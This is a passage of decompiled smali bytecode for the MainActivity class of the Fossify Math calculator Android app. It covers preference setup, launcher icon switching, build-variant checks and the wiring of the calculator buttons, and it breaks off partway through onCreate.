.class public final Lorg/fossify/math/activities/MainActivity;
.super Lu5/f;
.source "SourceFile"

# interfaces
.implements LB5/a;


# static fields
.field public static final synthetic S:I


# instance fields
.field public N:I

.field public O:Z

.field public P:Ljava/lang/String;

.field public Q:LB5/b;

.field public final R:Ljava/lang/Object;


# direct methods
.method public constructor <init>()V
    .locals 2

    invoke-direct {p0}, LZ4/g;-><init>()V

    const/4 v0, 0x1

    iput-boolean v0, p0, Lorg/fossify/math/activities/MainActivity;->O:Z

    const-string v0, ""

    iput-object v0, p0, Lorg/fossify/math/activities/MainActivity;->P:Ljava/lang/String;

    new-instance v0, LT/U;

    const/4 v1, 0x5

    invoke-direct {v0, v1, p0}, LT/U;-><init>(ILjava/lang/Object;)V

    sget-object v1, Lh4/e;->e:Lh4/e;

    invoke-static {v1, v0}, La/a;->E(Lh4/e;Lv4/a;)Lh4/d;

    move-result-object v0

    iput-object v0, p0, Lorg/fossify/math/activities/MainActivity;->R:Ljava/lang/Object;

    return-void
.end method


# virtual methods
.method public final L(Z)Z
    .locals 2

    invoke-virtual {p0}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->x:Landroid/widget/TextView;

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    invoke-static {v0}, Lcom/bumptech/glide/e;->p(Landroid/widget/TextView;)Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    :cond_0
    move-object v0, v1

    :goto_0
    if-eqz p1, :cond_2

    invoke-virtual {p0}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object p1

    iget-object p1, p1, Ly5/a;->B:Landroid/widget/TextView;

    if-eqz p1, :cond_1

    invoke-static {p1}, Lcom/bumptech/glide/e;->p(Landroid/widget/TextView;)Ljava/lang/String;

    move-result-object v1

    :cond_1
    move-object v0, v1

    :cond_2
    if-eqz v0, :cond_4

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result p1

    if-nez p1, :cond_3

    goto :goto_1

    :cond_3
    invoke-static {p0, v0}, Lo5/f;->i(Landroid/content/Context;Ljava/lang/String;)V

    const/4 p1, 0x1

    return p1

    :cond_4
    :goto_1
    const/4 p1, 0x0

    return p1
.end method

.method public final M()Ly5/a;
    .locals 1

    iget-object v0, p0, Lorg/fossify/math/activities/MainActivity;->R:Ljava/lang/Object;

    invoke-interface {v0}, Lh4/d;->getValue()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ly5/a;

    return-object v0
.end method

.method public final N(Landroid/widget/TextView;Ljava/lang/String;)V
    .locals 2

    new-instance v0, LD5/a;

    const/16 v1, 0x15

    invoke-direct {v0, v1, p0, p2}, LD5/a;-><init>(ILjava/lang/Object;Ljava/lang/Object;)V

    new-instance p2, Lu5/c;

    const/4 v1, 0x0

    invoke-direct {p2, v1, v0, p0}, Lu5/c;-><init>(ILjava/lang/Object;Ljava/lang/Object;)V

    invoke-virtual {p1, p2}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    return-void
.end method

.method public final a(Landroid/content/Context;Ljava/lang/String;)V
    .locals 0

    const-string p1, "value"

    invoke-static {p1, p2}, Lw4/k;->e(Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual {p0}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object p1

    iget-object p1, p1, Ly5/a;->B:Landroid/widget/TextView;

    if-eqz p1, :cond_0

    invoke-virtual {p1, p2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    :cond_0
    return-void
.end method

.method public final f(Landroid/content/Context;Ljava/lang/String;)V
    .locals 0

    const-string p1, "value"

    invoke-static {p1, p2}, Lw4/k;->e(Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual {p0}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object p1

    iget-object p1, p1, Ly5/a;->x:Landroid/widget/TextView;

    if-eqz p1, :cond_0

    invoke-virtual {p1, p2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    :cond_0
    return-void
.end method

.method public final onCreate(Landroid/os/Bundle;)V
    .locals 20

    move-object/from16 v1, p0

    move-object/from16 v0, p1

    invoke-super/range {p0 .. p1}, LZ4/g;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v2

    iget-object v2, v2, Ly5/a;->a:Landroidx/coordinatorlayout/widget/CoordinatorLayout;

    invoke-virtual {v1, v2}, Lj/i;->setContentView(Landroid/view/View;)V

    invoke-static {v1}, Lo5/f;->r(Landroid/content/Context;)Lp5/b;

    move-result-object v2

    invoke-static {v1}, Lo5/g;->c(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "internalStoragePath"

    invoke-static {v4, v3}, Lw4/k;->e(Ljava/lang/String;Ljava/lang/Object;)V

    iget-object v2, v2, Lp5/b;->b:Landroid/content/SharedPreferences;

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v4, "internal_storage_path"

    invoke-interface {v2, v4, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    new-instance v2, LD4/j;

    const/16 v3, 0x13

    invoke-direct {v2, v3, v1}, LD4/j;-><init>(ILjava/lang/Object;)V

    invoke-static {v2}, Lp5/d;->a(Lv4/a;)V

    invoke-static {v1}, Lo5/f;->r(Landroid/content/Context;)Lp5/b;

    move-result-object v2

    iget-object v2, v2, Lp5/b;->b:Landroid/content/SharedPreferences;

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v3, "app_id"

    const-string v4, "org.fossify.math"

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    invoke-static {v1}, Lo5/f;->r(Landroid/content/Context;)Lp5/b;

    move-result-object v2

    invoke-virtual {v2}, Lp5/b;->e()I

    move-result v2

    const/4 v3, 0x0

    const-string v5, "was_orange_icon_checked"

    const-string v6, ".debug"

    const/4 v7, 0x0

    const/4 v8, 0x1

    if-nez v2, :cond_0

    invoke-static {v1}, Lo5/f;->r(Landroid/content/Context;)Lp5/b;

    move-result-object v2

    iget-object v2, v2, Lp5/b;->b:Landroid/content/SharedPreferences;

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    invoke-interface {v2, v5, v8}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    invoke-static {v1}, Ly4/a;->i(Landroid/content/Context;)V

    goto/16 :goto_1

    :cond_0
    invoke-static {v1}, Lo5/f;->r(Landroid/content/Context;)Lp5/b;

    move-result-object v2

    iget-object v2, v2, Lp5/b;->b:Landroid/content/SharedPreferences;

    invoke-interface {v2, v5, v7}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    if-nez v2, :cond_3

    invoke-static {v1}, Lo5/f;->r(Landroid/content/Context;)Lp5/b;

    move-result-object v2

    iget-object v2, v2, Lp5/b;->b:Landroid/content/SharedPreferences;

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    invoke-interface {v2, v5, v8}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    invoke-virtual {v1}, Lj/i;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    const v5, 0x7f060035

    invoke-virtual {v2, v5}, Landroid/content/res/Resources;->getColor(I)I

    move-result v2

    invoke-static {v1}, Lo5/f;->r(Landroid/content/Context;)Lp5/b;

    move-result-object v5

    invoke-virtual {v5}, Lp5/b;->c()I

    move-result v5

    if-eq v5, v2, :cond_3

    invoke-static {v1}, Ly4/a;->q(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v5

    invoke-virtual {v5}, Ljava/util/ArrayList;->size()I

    move-result v9

    move v10, v7

    move v11, v10

    :goto_0
    if-ge v11, v9, :cond_2

    invoke-virtual {v5, v11}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v12

    add-int/lit8 v11, v11, 0x1

    add-int/lit8 v13, v10, 0x1

    if-ltz v10, :cond_1

    check-cast v12, Ljava/lang/Number;

    invoke-virtual {v12}, Ljava/lang/Number;->intValue()I

    move-result v12

    invoke-static {v1, v4, v10, v12, v7}, Ly4/a;->U(Landroid/content/Context;Ljava/lang/String;IIZ)V

    move v10, v13

    goto :goto_0

    :cond_1
    invoke-static {}, Ly4/a;->T()V

    throw v3

    :cond_2
    invoke-static {v1}, Lo5/f;->r(Landroid/content/Context;)Lp5/b;

    move-result-object v4

    invoke-virtual {v4}, Lp5/b;->d()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4, v6}, LE4/e;->h0(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, ".activities.SplashActivity"

    invoke-virtual {v4, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v5

    new-instance v9, Landroid/content/ComponentName;

    invoke-static {v1}, Lo5/f;->r(Landroid/content/Context;)Lp5/b;

    move-result-object v10

    invoke-virtual {v10}, Lp5/b;->d()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10, v4}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v5, v9, v7, v8}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    invoke-static {v1}, Lo5/f;->r(Landroid/content/Context;)Lp5/b;

    move-result-object v4

    invoke-virtual {v4}, Lp5/b;->d()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4, v6}, LE4/e;->h0(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, ".activities.SplashActivity.Green"

    invoke-virtual {v4, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v5

    new-instance v9, Landroid/content/ComponentName;

    invoke-static {v1}, Lo5/f;->r(Landroid/content/Context;)Lp5/b;

    move-result-object v10

    invoke-virtual {v10}, Lp5/b;->d()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10, v4}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v5, v9, v8, v8}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    invoke-static {v1}, Lo5/f;->r(Landroid/content/Context;)Lp5/b;

    move-result-object v4

    invoke-virtual {v4, v2}, Lp5/b;->q(I)V

    invoke-static {v1}, Lo5/f;->r(Landroid/content/Context;)Lp5/b;

    move-result-object v4

    iget-object v4, v4, Lp5/b;->b:Landroid/content/SharedPreferences;

    const-string v5, "last_icon_color"

    invoke-static {v4, v5, v2}, LA/j;->p(Landroid/content/SharedPreferences;Ljava/lang/String;I)V

    :cond_3
    :goto_1
    invoke-static {v1}, Lo5/f;->r(Landroid/content/Context;)Lp5/b;

    move-result-object v2

    invoke-virtual {v2}, Lp5/b;->e()I

    move-result v4

    add-int/2addr v4, v8

    iget-object v2, v2, Lp5/b;->b:Landroid/content/SharedPreferences;

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v5, "app_run_count"

    invoke-interface {v2, v5, v4}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    invoke-static {v1}, Lo5/f;->r(Landroid/content/Context;)Lp5/b;

    move-result-object v2

    invoke-virtual {v2}, Lp5/b;->e()I

    move-result v2

    rem-int/lit8 v2, v2, 0x1e

    const v4, 0x7f050003

    if-nez v2, :cond_6

    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    const-string v5, "getPackageName(...)"

    invoke-static {v5, v2}, Lw4/k;->d(Ljava/lang/String;Ljava/lang/Object;)V

    const-string v9, "org.fossify."

    invoke-static {v2, v9, v7}, LE4/l;->Q(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v2

    if-eqz v2, :cond_4

    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-static {v5, v2}, Lw4/k;->d(Ljava/lang/String;Ljava/lang/Object;)V

    invoke-static {v2, v6}, LE4/e;->h0(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v5, ".pro"

    invoke-static {v2, v5, v7}, LE4/l;->M(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v2

    if-eqz v2, :cond_4

    goto :goto_2

    :cond_4
    invoke-virtual {v1}, Lj/i;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    invoke-virtual {v2, v4}, Landroid/content/res/Resources;->getBoolean(I)Z

    move-result v2

    if-nez v2, :cond_6

    sget-object v2, Lp5/d;->c:Ljava/util/ArrayList;

    invoke-static {v1}, Lo5/f;->r(Landroid/content/Context;)Lp5/b;

    move-result-object v5

    invoke-virtual {v5}, Lp5/b;->d()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5, v6}, LE4/e;->h0(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, LE4/e;->g0(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/util/ArrayList;->contains(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_5

    new-instance v2, Ln5/u;

    const/4 v5, 0x1

    invoke-direct {v2, v1, v5}, Ln5/u;-><init>(Lorg/fossify/math/activities/MainActivity;I)V

    goto :goto_2

    :cond_5
    invoke-static {v1, v8}, Lo5/f;->L(Landroid/content/Context;Z)Z

    move-result v2

    if-nez v2, :cond_6

    new-instance v2, Ln5/u;

    const/4 v5, 0x0

    invoke-direct {v2, v1, v5}, Ln5/u;-><init>(Lorg/fossify/math/activities/MainActivity;I)V

    :cond_6
    :goto_2
    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v2

    iget-object v2, v2, Ly5/a;->A:Lcom/google/android/material/appbar/MaterialToolbar;

    new-instance v5, LI1/b;

    const/16 v6, 0xc

    invoke-direct {v5, v6, v1}, LI1/b;-><init>(ILjava/lang/Object;)V

    invoke-virtual {v2, v5}, Landroidx/appcompat/widget/Toolbar;->setOnMenuItemClickListener(Lp/a1;)V

    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v2

    iget-object v2, v2, Ly5/a;->A:Lcom/google/android/material/appbar/MaterialToolbar;

    invoke-virtual {v2}, Landroidx/appcompat/widget/Toolbar;->getMenu()Landroid/view/Menu;

    move-result-object v2

    const v5, 0x7f090212

    invoke-interface {v2, v5}, Landroid/view/Menu;->findItem(I)Landroid/view/MenuItem;

    move-result-object v2

    invoke-virtual {v1}, Lj/i;->getResources()Landroid/content/res/Resources;

    move-result-object v5

    invoke-virtual {v5, v4}, Landroid/content/res/Resources;->getBoolean(I)Z

    move-result v4

    xor-int/2addr v4, v8

    invoke-interface {v2, v4}, Landroid/view/MenuItem;->setVisible(Z)Landroid/view/MenuItem;

    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v2

    iget-object v2, v2, Ly5/a;->z:Landroidx/core/widget/NestedScrollView;

    invoke-static {v2}, Ly4/a;->E(Ljava/lang/Object;)Ljava/util/List;

    move-result-object v2

    const/16 v4, 0x1d

    invoke-static {v1, v3, v2, v4}, LZ4/r;->B(LZ4/r;Ljava/util/List;Ljava/util/List;I)V

    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v2

    iget-object v2, v2, Ly5/a;->z:Landroidx/core/widget/NestedScrollView;

    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v3

    iget-object v3, v3, Ly5/a;->y:Lorg/fossify/commons/views/MyAppBarLayout;

    invoke-virtual {v1, v2, v3}, LZ4/r;->C(LG1/w;Lorg/fossify/commons/views/MyAppBarLayout;)V

    if-eqz v0, :cond_7

    const-string v2, "calculatorState"

    invoke-virtual {v0, v2}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    move-result-object v0

    const-string v2, "null cannot be cast to non-null type kotlin.String"

    invoke-static {v2, v0}, Lw4/k;->c(Ljava/lang/String;Ljava/lang/Object;)V

    check-cast v0, Ljava/lang/String;

    iput-object v0, v1, Lorg/fossify/math/activities/MainActivity;->P:Ljava/lang/String;

    :cond_7
    new-instance v0, LB5/b;

    invoke-virtual {v1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "getApplicationContext(...)"

    invoke-static {v3, v2}, Lw4/k;->d(Ljava/lang/String;Ljava/lang/Object;)V

    iget-object v3, v1, Lorg/fossify/math/activities/MainActivity;->P:Ljava/lang/String;

    invoke-direct {v0, v1, v2, v3}, LB5/b;-><init>(LB5/a;Landroid/content/Context;Ljava/lang/String;)V

    iput-object v0, v1, Lorg/fossify/math/activities/MainActivity;->Q:LB5/b;

    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->s:Landroid/widget/TextView;

    if-eqz v0, :cond_8

    const-string v2, "plus"

    invoke-virtual {v1, v0, v2}, Lorg/fossify/math/activities/MainActivity;->N(Landroid/widget/TextView;Ljava/lang/String;)V

    :cond_8
    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->p:Landroid/widget/TextView;

    if-eqz v0, :cond_9

    const-string v2, "minus"

    invoke-virtual {v1, v0, v2}, Lorg/fossify/math/activities/MainActivity;->N(Landroid/widget/TextView;Ljava/lang/String;)V

    :cond_9
    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->q:Landroid/widget/TextView;

    if-eqz v0, :cond_a

    const-string v2, "multiply"

    invoke-virtual {v1, v0, v2}, Lorg/fossify/math/activities/MainActivity;->N(Landroid/widget/TextView;Ljava/lang/String;)V

    :cond_a
    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->n:Landroid/widget/TextView;

    if-eqz v0, :cond_b

    const-string v2, "divide"

    invoke-virtual {v1, v0, v2}, Lorg/fossify/math/activities/MainActivity;->N(Landroid/widget/TextView;Ljava/lang/String;)V

    :cond_b
    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->r:Landroid/widget/TextView;

    if-eqz v0, :cond_c

    const-string v2, "percent"

    invoke-virtual {v1, v0, v2}, Lorg/fossify/math/activities/MainActivity;->N(Landroid/widget/TextView;Ljava/lang/String;)V

    :cond_c
    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->t:Landroid/widget/TextView;

    if-eqz v0, :cond_d

    const-string v2, "power"

    invoke-virtual {v1, v0, v2}, Lorg/fossify/math/activities/MainActivity;->N(Landroid/widget/TextView;Ljava/lang/String;)V

    :cond_d
    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->v:Landroid/widget/TextView;

    if-eqz v0, :cond_e

    const-string v2, "root"

    invoke-virtual {v1, v0, v2}, Lorg/fossify/math/activities/MainActivity;->N(Landroid/widget/TextView;Ljava/lang/String;)V

    :cond_e
    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->p:Landroid/widget/TextView;

    if-eqz v0, :cond_f

    new-instance v2, Lu5/a;

    const/4 v3, 0x0

    invoke-direct {v2, v1, v3}, Lu5/a;-><init>(Lorg/fossify/math/activities/MainActivity;I)V

    invoke-virtual {v0, v2}, Landroid/view/View;->setOnLongClickListener(Landroid/view/View$OnLongClickListener;)V

    :cond_f
    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->l:Landroid/widget/TextView;

    if-eqz v0, :cond_10

    new-instance v2, Lu5/b;

    const/4 v3, 0x1

    invoke-direct {v2, v1, v3}, Lu5/b;-><init>(Lorg/fossify/math/activities/MainActivity;I)V

    new-instance v3, Lu5/c;

    const/4 v4, 0x0

    invoke-direct {v3, v4, v2, v1}, Lu5/c;-><init>(ILjava/lang/Object;Ljava/lang/Object;)V

    invoke-virtual {v0, v3}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    :cond_10
    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->l:Landroid/widget/TextView;

    if-eqz v0, :cond_11

    new-instance v2, Lu5/a;

    const/4 v3, 0x1

    invoke-direct {v2, v1, v3}, Lu5/a;-><init>(Lorg/fossify/math/activities/MainActivity;I)V

    invoke-virtual {v0, v2}, Landroid/view/View;->setOnLongClickListener(Landroid/view/View$OnLongClickListener;)V

    :cond_11
    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v9, v0, Ly5/a;->m:Landroid/widget/TextView;

    iget-object v10, v0, Ly5/a;->b:Landroid/widget/TextView;

    iget-object v11, v0, Ly5/a;->c:Landroid/widget/TextView;

    iget-object v12, v0, Ly5/a;->d:Landroid/widget/TextView;

    iget-object v13, v0, Ly5/a;->e:Landroid/widget/TextView;

    iget-object v14, v0, Ly5/a;->f:Landroid/widget/TextView;

    iget-object v15, v0, Ly5/a;->g:Landroid/widget/TextView;

    iget-object v2, v0, Ly5/a;->h:Landroid/widget/TextView;

    iget-object v3, v0, Ly5/a;->i:Landroid/widget/TextView;

    iget-object v4, v0, Ly5/a;->j:Landroid/widget/TextView;

    iget-object v0, v0, Ly5/a;->k:Landroid/widget/TextView;

    move-object/from16 v19, v0

    move-object/from16 v16, v2

    move-object/from16 v17, v3

    move-object/from16 v18, v4

    filled-new-array/range {v9 .. v19}, [Landroid/widget/TextView;

    move-result-object v0

    move v2, v7

    :goto_3
    const/16 v3, 0xb

    if-ge v2, v3, :cond_13

    aget-object v3, v0, v2

    if-eqz v3, :cond_12

    new-instance v4, Lu5/b;

    const/4 v5, 0x2

    invoke-direct {v4, v1, v5}, Lu5/b;-><init>(Lorg/fossify/math/activities/MainActivity;I)V

    new-instance v5, Lu5/c;

    const/4 v6, 0x0

    invoke-direct {v5, v6, v4, v1}, Lu5/c;-><init>(ILjava/lang/Object;Ljava/lang/Object;)V

    invoke-virtual {v3, v5}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    :cond_12
    add-int/lit8 v2, v2, 0x1

    goto :goto_3

    :cond_13
    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->o:Landroid/widget/TextView;

    if-eqz v0, :cond_14

    new-instance v2, Lu5/b;

    const/4 v3, 0x3

    invoke-direct {v2, v1, v3}, Lu5/b;-><init>(Lorg/fossify/math/activities/MainActivity;I)V

    new-instance v3, Lu5/c;

    const/4 v4, 0x0

    invoke-direct {v3, v4, v2, v1}, Lu5/c;-><init>(ILjava/lang/Object;Ljava/lang/Object;)V

    invoke-virtual {v0, v3}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    :cond_14
    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->x:Landroid/widget/TextView;

    if-eqz v0, :cond_15

    new-instance v2, Lu5/a;

    const/4 v3, 0x2

    invoke-direct {v2, v1, v3}, Lu5/a;-><init>(Lorg/fossify/math/activities/MainActivity;I)V

    invoke-virtual {v0, v2}, Landroid/view/View;->setOnLongClickListener(Landroid/view/View$OnLongClickListener;)V

    :cond_15
    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->B:Landroid/widget/TextView;

    if-eqz v0, :cond_16

    new-instance v2, Lu5/a;

    const/4 v3, 0x3

    invoke-direct {v2, v1, v3}, Lu5/a;-><init>(Lorg/fossify/math/activities/MainActivity;I)V

    invoke-virtual {v0, v2}, Landroid/view/View;->setOnLongClickListener(Landroid/view/View$OnLongClickListener;)V

    :cond_16
    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->B:Landroid/widget/TextView;

    invoke-static {v0}, LX4/c;->b(Landroid/widget/TextView;)V

    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->x:Landroid/widget/TextView;

    invoke-static {v0}, LX4/c;->b(Landroid/widget/TextView;)V

    invoke-static {v1}, LA5/a;->q(Landroid/content/Context;)LB5/d;

    move-result-object v0

    invoke-virtual {v0}, Lp5/b;->o()I

    move-result v0

    iput v0, v1, Lorg/fossify/math/activities/MainActivity;->N:I

    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->w:Landroid/widget/LinearLayout;

    if-eqz v0, :cond_17

    invoke-static {v1}, Ly4/a;->x(Landroid/content/Context;)I

    move-result v2

    invoke-static {v1, v0, v2}, LA5/a;->M(Lu5/f;Landroid/view/ViewGroup;I)V

    :cond_17
    invoke-virtual {v1}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->m:Landroid/widget/TextView;

    if-eqz v0, :cond_18

    invoke-static {}, Ljava/text/DecimalFormatSymbols;->getInstance()Ljava/text/DecimalFormatSymbols;

    move-result-object v2

    invoke-virtual {v2}, Ljava/text/DecimalFormatSymbols;->getDecimalSeparator()C

    move-result v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    :cond_18
    invoke-static {v1}, Lo5/f;->r(Landroid/content/Context;)Lp5/b;

    move-result-object v0

    iget-object v0, v0, Lp5/b;->b:Landroid/content/SharedPreferences;

    const-string v2, "was_app_on_sd_shown"

    invoke-interface {v0, v2, v7}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-nez v0, :cond_19

    :try_start_0
    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3, v7}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v0

    iget-object v0, v0, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    if-eqz v0, :cond_19

    iget v0, v0, Landroid/content/pm/ApplicationInfo;->flags:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/high16 v3, 0x40000

    and-int/2addr v0, v3

    if-ne v0, v3, :cond_19

    invoke-static {v1}, Lo5/f;->r(Landroid/content/Context;)Lp5/b;

    move-result-object v0

    iget-object v0, v0, Lp5/b;->b:Landroid/content/SharedPreferences;

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0, v2, v8}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    new-instance v0, Ln5/q;

    new-instance v5, LT/c;

    const/16 v2, 0x13

    invoke-direct {v5, v2}, LT/c;-><init>(I)V

    const/16 v6, 0x60

    const-string v2, ""

    const v3, 0x7f11004e

    const v4, 0x7f110332

    invoke-direct/range {v0 .. v6}, Ln5/q;-><init>(Landroid/app/Activity;Ljava/lang/String;IILv4/a;I)V

    :catch_0
    :cond_19

